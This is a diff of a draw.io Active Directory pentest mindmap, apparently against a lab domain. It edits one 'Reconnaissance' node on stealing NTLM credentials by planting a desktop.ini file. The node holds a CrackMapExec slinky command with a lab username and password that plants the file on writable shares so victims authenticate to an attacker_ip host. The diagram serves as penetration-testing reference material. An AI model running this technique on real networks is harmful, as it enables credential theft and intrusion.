@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2024-07-17T11:28:44.268Z" agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0" etag="KDDk6bs_ahEzhlOHsEMw" version="24.7.0" type="github" pages="7">
+<mxfile host="app.diagrams.net" modified="2024-07-17T11:29:25.146Z" agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0" etag="P3rEFUHU8GcS3n39Sx07" version="24.7.0" type="github" pages="7">
   <diagram name="Reconnaissance" id="l6uARz4Kyqoon4gwFnSB">
     <mxGraphModel dx="1434" dy="670" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -835,9 +835,9 @@
         <mxCell id="Yy7sR1aXQtWxQ2WAoCF2-13" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="Yy7sR1aXQtWxQ2WAoCF2-8" target="Yy7sR1aXQtWxQ2WAoCF2-12" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <object label="Steal NTLM creds&lt;br&gt;&lt;div&gt;with desktop.ini&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;smbclient + put desktop.ini&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" source="https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini" with_cme="cme smb castelblack.north.sevenkingdoms.local -u arya.stark -p &#39;Needle&#39; -d north.sevenkingdoms.local -M slinky -o NAME=.thumbs.db SERVER=attacker_ip" id="Yy7sR1aXQtWxQ2WAoCF2-8">
+        <object label="Steal NTLM creds&lt;br&gt;&lt;div&gt;with desktop.ini&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;smbclient + put desktop.ini&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;or automatic with cme : search writable share and inject&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;&lt;br&gt;&lt;/font&gt;&lt;/div&gt;" source="https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini" with_cme="cme smb castelblack.north.sevenkingdoms.local -u arya.stark -p &#39;Needle&#39; -d north.sevenkingdoms.local -M slinky -o NAME=.thumbs.db SERVER=attacker_ip" id="Yy7sR1aXQtWxQ2WAoCF2-8">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#ffc000;" parent="1" vertex="1">
-            <mxGeometry y="411" width="160" height="80" as="geometry" />
+            <mxGeometry y="390" width="170" height="110" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="Yy7sR1aXQtWxQ2WAoCF2-14" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=1;entryY=0;entryDx=0;entryDy=0;" parent="1" source="Yy7sR1aXQtWxQ2WAoCF2-12" target="Iw_T4d_-wb4pz08Lo9XD-3" edge="1">
